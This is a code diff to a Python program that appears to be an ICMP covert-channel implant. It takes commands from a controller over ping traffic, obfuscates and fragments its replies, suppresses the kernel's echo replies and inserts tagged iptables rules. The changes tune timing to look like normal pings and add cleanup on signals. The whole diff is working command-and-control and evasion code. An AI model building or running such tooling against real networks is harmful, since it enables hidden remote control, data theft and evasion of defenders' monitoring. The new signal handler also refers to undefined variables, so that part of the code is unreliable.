@@ -15,13 +15,15 @@ import os
 import math
 import atexit
 import ctypes
+import signal
+import uuid
 
 is_echo = False
 
 ICMP_ID = 0x1111
 DEFAULT_SHIFT_VALUE = 1
 DEFAULT_RAILFENCE_RAILS = 4
-DEFAULT_BIT_RAILFENCE_RAILS = 7		# Set >=2
+DEFAULT_BIT_RAILFENCE_RAILS = 7        # Set at >=2
 HANDSHAKE_PREFIX = b"SYNC:"
 ACK_PREFIX = b"ACK:"
 PROBE_COMMAND = b"probe"  
@@ -34,33 +36,65 @@ PADDING_MAX = 5
 REDUNDANCY_FACTOR = 0.1  
 FRAG_TIMEOUT = 60  
 
+firewall_marker = None
+
 def apply_blocking_rules(family, rep_type):
+    global firewall_marker
+    firewall_marker = str(uuid.uuid4())[:12]
+
     if family == socket.AF_INET:
-        cmds = [
-            ['iptables', '-A', 'OUTPUT', '-p', 'icmp', '--icmp-type', str(rep_type), '-m', 'owner', '--uid-owner', '0', '-j', 'ACCEPT'],
-            ['iptables', '-A', 'OUTPUT', '-p', 'icmp', '--icmp-type', str(rep_type), '-j', 'DROP']
-        ]
+        cmd_base = ['iptables']
+        proto = 'icmp'
+        type_flag = '--icmp-type'
     else:
-        cmds = [
-            ['ip6tables', '-A', 'OUTPUT', '-p', 'icmpv6', '--icmpv6-type', str(rep_type), '-m', 'owner', '--uid-owner', '0', '-j', 'ACCEPT'],
-            ['ip6tables', '-A', 'OUTPUT', '-p', 'icmpv6', '--icmpv6-type', str(rep_type), '-j', 'DROP']
-        ]
-    for cmd in cmds:
-        subprocess.run(cmd, check=True)
+        cmd_base = ['ip6tables']
+        proto = 'icmpv6'
+        type_flag = '--icmpv6-type'
+
+    subprocess.run(cmd_base + [
+        '-A', 'OUTPUT',
+        '-p', proto,
+        type_flag, str(rep_type),
+        '-m', 'owner', '--uid-owner', '0',
+        '-m', 'comment', '--comment', firewall_marker,
+        '-j', 'ACCEPT'
+    ])
+
+    subprocess.run(cmd_base + [
+        '-A', 'OUTPUT',
+        '-p', proto,
+        type_flag, str(rep_type),
+        '-m', 'comment', '--comment', firewall_marker,
+        '-j', 'DROP'
+    ])
 
 def cleanup_blocking_rules(family, rep_type):
+    global firewall_marker
+    if not firewall_marker:
+        return
     if family == socket.AF_INET:
-        cmds = [
-            ['iptables', '-D', 'OUTPUT', '-p', 'icmp', '--icmp-type', str(rep_type), '-j', 'DROP'],
-            ['iptables', '-D', 'OUTPUT', '-p', 'icmp', '--icmp-type', str(rep_type), '-m', 'owner', '--uid-owner', '0', '-j', 'ACCEPT']
-        ]
+        cmd_base = ['iptables']
     else:
-        cmds = [
-            ['ip6tables', '-D', 'OUTPUT', '-p', 'icmpv6', '--icmpv6-type', str(rep_type), '-j', 'DROP'],
-            ['ip6tables', '-D', 'OUTPUT', '-p', 'icmpv6', '--icmpv6-type', str(rep_type), '-m', 'owner', '--uid-owner', '0', '-j', 'ACCEPT']
-        ]
-    for cmd in cmds:
-        subprocess.run(cmd, check=True, stderr=subprocess.DEVNULL)  
+        cmd_base = ['ip6tables']
+    try:
+        subprocess.run(cmd_base + [
+            '-D', 'OUTPUT',
+            '-p', 'icmp' if family == socket.AF_INET else 'icmpv6',
+            '--icmp-type' if family == socket.AF_INET else '--icmpv6-type',
+            str(rep_type),
+            '-m', 'comment', '--comment', firewall_marker,
+            '-j', 'ACCEPT'
+        ], stderr=subprocess.DEVNULL)
+        subprocess.run(cmd_base + [
+            '-D', 'OUTPUT',
+            '-p', 'icmp' if family == socket.AF_INET else 'icmpv6',
+            '--icmp-type' if family == socket.AF_INET else '--icmpv6-type',
+            str(rep_type),
+            '-m', 'comment', '--comment', firewall_marker,
+            '-j', 'DROP'
+        ], stderr=subprocess.DEVNULL)
+    except:
+        pass
 
 def suppress_icmp(family):
     ignore_file = '/proc/sys/net/ipv4/icmp_echo_ignore_all' if family == socket.AF_INET else '/proc/sys/net/ipv6/icmp/echo_ignore_all'
@@ -519,15 +553,15 @@ def compute_delay(delay_mode, delay_min, delay_max, rtt=None):
     if is_echo:
         return 1.0
     base = {
-        'uniform': random.uniform(delay_min, delay_max),
-        'exponential': random.expovariate(1 / ((delay_min + delay_max) / 2)),
-        'gamma': random.gammavariate(2, (delay_max - delay_min) / 2) + delay_min
+        'uniform': random.uniform(1.0, 1.8),
+        'exponential': random.expovariate(1 / 1.4) + 0.8,
+        'gamma': random.gammavariate(2, 0.4) + 1.0
     }[delay_mode]
     if rtt:
         base *= (1 + (rtt / 1000))
-    base = min(max(base, delay_min), delay_max * 2)
-    jitter = base * random.uniform(-0.2, 0.2)
-    return min(max(base + jitter, delay_min), delay_max * 2)
+    base = min(max(base, 1.0), 1.8)
+    jitter = base * random.uniform(-0.1, 0.1)
+    return min(max(base + jitter, 1.0), 1.8)
 
 def send_packet(controller_ip, rep_type, icmp_id, seq, payload, family, proto, poly_seed=None, mutation_count=3):
     icmp_code = 0
@@ -658,7 +692,7 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                                 if len(rest) < len(FRAG_START) + 40:
                                     continue
                                 frag_id, total_frags, overall_hash = struct.unpack('!4sI32s', rest[len(FRAG_START):len(FRAG_START)+40])
-                                frag_buffers[frag_id] = {'frags': {}, 'total': total_frags, 'hash': overall_hash, 'ts': time.time(), 'is_encrypted': True}
+                                frag_buffers[frag_id] = {'frags': {}, 'total': total_frags, 'hash': overall_hash, 'ts': time.time()}
                             elif rest.startswith(FRAG_PREFIX):
                                 if len(rest) < len(FRAG_PREFIX) + 8:
                                     continue
@@ -736,7 +770,7 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                                         num, frag_data = trans['frags'][trans['sent']]
                                         frag_payload = out_prefix + FRAG_PREFIX + struct.pack('!4sI', fid, num) + frag_data
                                         encrypted_frag = light_encrypt(frag_payload, padding_seed, sub_table, shift, railfence_rails, bit_rails, layers, selected_ops)
-                                        time.sleep(compute_delay(delay_mode, delay_min, delay_max))
+                                        time.sleep(random.uniform(0.005, 0.05))
                                         send_packet(addr[0], rep_type, icmp_id, pkt_seq, encrypted_frag, family, proto, poly_seed, mutation_count)
                                         trans['sent'] += 1
                                         trans['last_sent'] = time.time()
@@ -747,6 +781,10 @@ def receive_commands(req_type, rep_type, icmp_id, family, proto, local_ip):
                 if time.time() - frag_buffers[fid]['ts'] > FRAG_TIMEOUT:
                     del frag_buffers[fid]
 
+def signal_handler(signum, frame):
+    cleanup_blocking_rules(family, rep_type)
+    sys.exit(0)
+
 def main(req_type, rep_type, icmp_id, family, proto):
     global is_echo
     is_echo = (req_type == 8 and rep_type == 0) or (req_type == 128 and rep_type == 129)
@@ -756,6 +794,9 @@ def main(req_type, rep_type, icmp_id, family, proto):
     
     apply_blocking_rules(family, rep_type)
     atexit.register(cleanup_blocking_rules, family, rep_type)
+    
+    signal.signal(signal.SIGTERM, signal_handler)
+    signal.signal(signal.SIGINT, signal_handler)
     
     ignore_file = None
     if is_echo:
@@ -859,4 +900,3 @@ if __name__ == "__main__":
             sys.exit(1)
 
     main(req_type, rep_type, args.id, family, proto)
-
